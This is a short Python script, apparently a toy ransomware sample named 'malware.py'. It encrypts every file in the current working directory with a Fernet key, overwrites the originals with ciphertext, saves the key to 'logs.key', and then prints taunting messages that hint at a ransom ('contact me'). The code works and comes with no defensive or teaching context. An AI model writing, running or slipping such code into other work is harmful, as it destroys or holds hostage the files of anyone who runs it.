#!/usr/bin/env python3

# access necessary components

import os
from cryptography.fernet import Fernet

# find the files to encrypt

files = []

for file in os.listdir():
    if file == "malware.py" or file == "logs.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

# generate an AES encryption key

key = Fernet.generate_key()

# add key to a file

with open("logs.key", "wb") as logs:
    logs.write(key)

# encrypt the files

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("Well, you ran the script. What exactly did you think would happen here?")
print("Oh you thought this file was just a joke did you?")
print("Not an actual serious piece of software that was capable of destroying your computer?")
print("Well you were wrong...")
print("Good luck trying to recover everything!")
print("Or you could just contact me...")
